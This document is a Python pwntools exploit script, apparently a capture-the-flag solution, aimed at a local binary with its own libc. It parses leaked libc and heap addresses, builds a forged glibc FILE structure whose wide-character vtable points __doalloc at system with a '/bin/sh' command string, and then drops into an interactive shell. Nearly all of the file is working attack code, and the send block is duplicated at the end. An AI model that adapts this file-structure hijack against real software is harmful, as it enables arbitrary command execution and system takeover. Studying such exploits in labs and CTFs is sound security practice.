#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnlib.util.proc import wait_for_debugger
from pwn import *
from pwnlib import gdb
from typing import no_type_check

context.terminal = "tmux neww -a".split()
context.aslr = False

exe = context.binary = ELF(args.EXE or "main")  # type: ignore
libc = ELF("./libc.so.6")


@no_type_check
def start(argv=[], *a, **kw) -> process:
    return process([exe.path] + argv, *a, **kw)


gdbscript = """
continue
""".format(**locals())


io = start()
sla = io.sendlineafter
sa = io.sendafter
sl = io.sendline
ru = io.recvuntil
rl = io.recvline


@no_type_check
def bp():
    if args.GDB:
        wait_for_debugger(io.pid)
        pause()


ru(b"puts:")
libc.address = int(ru(b" ", drop=True), 16) - libc.sym["puts"]

ru(b"heap:")
heap = int(ru(b" ", drop=True), 16)

info("libc: %#x", libc.address)
info("heap: %#x", heap)

fp_at = heap
info("fp_at: %#x", fp_at)

# fmt: off
fp = {
    # _IO_FILE
    # -----------------------------

    0: b"a;/bin/sh\x00", # fp->_flags & _IO_NO_WRITE check in _IO_wdoallocbuf
    192: p32(10),   # mode, fp->_mode > 0
    130: p8(0),     # _vtable_offset, _IO_vtable_offset (fp) == 0
    136: libc.sym["_IO_stdfile_0_lock"],
    160: fp_at,     # _wide_data
    216: libc.sym["_IO_wfile_jumps"],  # <-- ADD THIS

    # _IO_wide_data
    # -----------------------------

    # fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
    24: 0,      # _IO_write_base
    32: 8,      # _IO_write_ptr
    48: 0,      # _IO_buf_base, fp->_wide_data->_IO_buf_base
    224: fp_at, # _wide_vtable

    # _IO_wide_data->_wide_vtable
    # -----------------------------

    104: libc.sym["system"], # __doalloc
}
# fmt: off


fp = flat(fp, length=0xF0, filler="\x00")

bp()
io.send(fp)

# fmt: on

fp = flat(fp, length=0xF0, filler="\x00")

bp()
io.send(fp)

io.interactive()
